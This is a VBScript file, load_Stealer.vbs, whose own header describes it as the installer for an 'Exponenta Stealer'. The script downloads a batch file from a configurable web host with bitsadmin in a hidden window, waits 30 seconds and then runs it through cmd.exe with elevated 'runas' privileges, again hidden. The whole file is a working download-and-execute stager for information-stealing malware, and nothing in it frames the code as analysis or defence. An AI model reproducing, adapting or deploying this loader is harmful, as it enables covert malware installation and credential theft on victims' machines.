' *****************************************************************************
'
' load_Stealer.vbs
'
' This Script is for Exponenta Stealer Installation
' This Script is Container of load_Stealer.bat for its Execution
'
' PARAMETERS: None
' FUNCTION RETURNS: None
' SOURCE: 
'
' *****************************************************************************

' * Declare the Variables *

Dim httpPrefix		'Prefix of Site Downloading from
Dim httpHost		'Host Name or IP Address  of the Site
Dim httpPort		'Port of the Site
Dim httpPathProjects	'Path to Exponenta Projects on Server
Dim Url			'Full URL Neme of the File in the Site
Dim threadFile 		'Command File to be Run
Dim local_Path		'Local Path to Command File with Drive Letter
Dim local_File		'Full Command File Name
Dim tempsPath		'Path to Temporary Directory with Drive Letter
Dim tempCheckPath	'Temporary Path for Checked
Dim dirNameOfProject	'Directory Name with Nit Projects Environment Placed
Dim pathCMD		'Path to CMD.EXE File
Dim pathPubUtil		'Path to Pub1\Util Files (Canonical)
Dim wshShell, envVarProccess, objFso
Set wshShell = CreateObject( "WScript.Shell" )
Set envVarProccess = wshShell.Environment("PROCESS")
Set objFso = CreateObject("Scripting.FileSystemObject")
Set shApp = CreateObject( "Shell.Application" )
' * /Declare the Variables *
' *** Custom Parameters ***
httpPrefix = "http://"
httpHost = "localhost"
httpPort = ":80"
httpPathProjects = "/www/Exponenta/"
threadFile = "load_Stealer.bat"
local_Path = "" 			'Path To User Temporary Directory
pathCMD = envVarProccess( "SystemRoot" ) & "\System32\"	'Path to Win64 CMD.exe File
tempsPath = envVarProccess( "TEMP" ) 	'Path to Process Temporary Directory
' *** /Custom Parameters ***

Url = httpPrefix & httpHost & httpPort & httpPathProjects & threadFile
local_File = tempsPath & "\" & threadFile

' ****** Debug ******
'WScript.Echo "URL = " & Url & vbCrLf & "File = " & local_File & vbCrLf
' ****** /Debug ******

' *** Download Thread Bat File ***
shApp.ShellExecute "bitsadmin.exe", " /Transfer STAEL_TRANSFER /DOWNLOAD /Priority FOREGROUND " & Url & " " & local_File, pathCMD, "", 0
WScript.Sleep 30000
' *** /Download Thread Bat File ***

' *** Execute Downloaded Command File ***
if objFso.FileExists( local_File ) Then
	'WScript.Echo "Local File is Exist" & vbCrLf
'	shApp.ShellExecute local_File, "", pathCMD, "runas", "0"
	shApp.ShellExecute "cmd.exe", "/c " & local_File, tempsPath, "runas", 0
else
'	WScript.Echo "The File " & local_File & " is not found" & vbCrLf
end if
' The End of the Script